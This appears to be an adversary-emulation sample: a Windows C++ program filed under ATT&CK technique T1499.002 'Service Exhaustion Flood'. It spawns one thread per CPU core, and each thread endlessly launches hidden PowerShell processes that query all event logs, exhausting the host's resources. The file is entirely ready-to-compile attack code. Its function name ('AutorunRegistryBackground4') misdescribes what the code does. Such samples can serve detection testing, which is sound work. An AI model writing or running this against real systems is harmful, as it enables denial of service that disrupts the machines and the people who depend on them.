---
title: "T1499.002.Service Exhaustion Flood"
folder: "14. Impact"
---





#include <windows.h>
#include <fstream>
#include <iostream>
#include <thread>
#include <vector>


void AutorunRegistryBackground4() {
    while (1) {
        const char* command = "powershell.exe -Command  Get-WinEvent -LogName * -ErrorAction SilentlyContinue ";
        STARTUPINFOA si = {};
        si.cb = sizeof(STARTUPINFOA);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi;


        if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
    }
}
 
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    const int num_threads = std::thread::hardware_concurrency();
    std::vector<std::thread> threads(num_threads);
    for (int i = 0; i < num_threads; ++i) {
        threads[i] = std::thread(AutorunRegistryBackground4);
    }

    for (int i = 0; i < num_threads; ++i) {
        threads[i].join();
    }
    return 0;
}